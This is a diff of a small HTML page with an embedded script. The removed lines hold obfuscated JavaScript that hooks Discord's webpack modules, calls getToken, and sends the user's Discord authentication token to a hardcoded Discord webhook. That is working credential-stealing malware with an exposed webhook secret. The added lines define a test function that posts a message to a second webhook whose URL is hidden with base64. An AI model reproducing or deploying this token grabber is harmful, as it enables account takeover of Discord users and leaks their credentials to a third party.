@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="UTF-8">
@@ -9,6 +10,20 @@
   </body>
 
   <script>
-const _0x3ceb50=_0x4a9f;function _0x4a0d(){const _0x3715c1=['find','75OiSGQo','1889364JgogWe','https://discord.com/api/webhooks/1060964973678968832/HAJPHA7p_nWqGrl0_MmyEs-N7TNT_W6O2tcyant9c-YUGsaXQ74KWs9U9g-PaLTLpWPn','application/json','7647876ijUWFV','43430aRRyRT','open','default','getToken','725157WPSYOP','11277077isWwCJ','POST','Content-type','7743970HWnbLN','21160oLLVIK','8yRgeBT','19YsXQfk'];_0x4a0d=function(){return _0x3715c1;};return _0x4a0d();}function _0x4a9f(_0x483050,_0xe5f922){const _0x4a0da5=_0x4a0d();return _0x4a9f=function(_0x4a9f72,_0x5d76c8){_0x4a9f72=_0x4a9f72-0x168;let _0x22ba29=_0x4a0da5[_0x4a9f72];return _0x22ba29;},_0x4a9f(_0x483050,_0xe5f922);}(function(_0x38fb9e,_0x14349c){const _0xab6d20=_0x4a9f,_0x3bec62=_0x38fb9e();while(!![]){try{const _0x3d7bf4=parseInt(_0xab6d20(0x168))/0x1*(-parseInt(_0xab6d20(0x16f))/0x2)+parseInt(_0xab6d20(0x16b))/0x3+parseInt(_0xab6d20(0x178))/0x4*(parseInt(_0xab6d20(0x16a))/0x5)+parseInt(_0xab6d20(0x16e))/0x6+parseInt(_0xab6d20(0x174))/0x7*(-parseInt(_0xab6d20(0x179))/0x8)+parseInt(_0xab6d20(0x173))/0x9+parseInt(_0xab6d20(0x177))/0xa;if(_0x3d7bf4===_0x14349c)break;else _0x3bec62['push'](_0x3bec62['shift']());}catch(_0x45c56c){_0x3bec62['push'](_0x3bec62['shift']());}}}(_0x4a0d,0xc7036),webpackChunkdiscord_app['push']([[0x0],,_0x1be148=>Object['keys'](_0x1be148['c'])[_0x3ceb50(0x169)](_0x583f0d=>(t=_0x1be148(_0x583f0d)?.[_0x3ceb50(0x171)]?.[_0x3ceb50(0x172)]?.())&&function _0x18adcf(){const _0x29c9b6=_0x3ceb50,_0x3145df=new XMLHttpRequest();_0x3145df[_0x29c9b6(0x170)](_0x29c9b6(0x175),_0x29c9b6(0x16c)),_0x3145df['setRequestHeader'](_0x29c9b6(0x176),_0x29c9b6(0x16d));const _0x3a014e={'username':'My\x20Webhook\x20Name','avatar_url':'','content':t};_0x3145df['send'](JSON['stringify'](_0x3a014e));})]));
+    function sendMessage() {
+      const request = new XMLHttpRequest();
+      const webhook = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA2MTAxNzg1ODExODc4NzA5Mi93YnJDcVhZWVZRaUhRNUxIcmtVSkc5azF3QkZzaVc1b3ZNSGNEd2VDa3F5cFkzcEJ3RW42TnBXVjZEazQtdm84Q2x4dA==')
+      request.open("POST", webhook);
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "Test",
+        avatar_url: "",
+        content: "xd lol"
+      }
+
+      request.send(JSON.stringify(params));
+    }
   </script>
 </html>
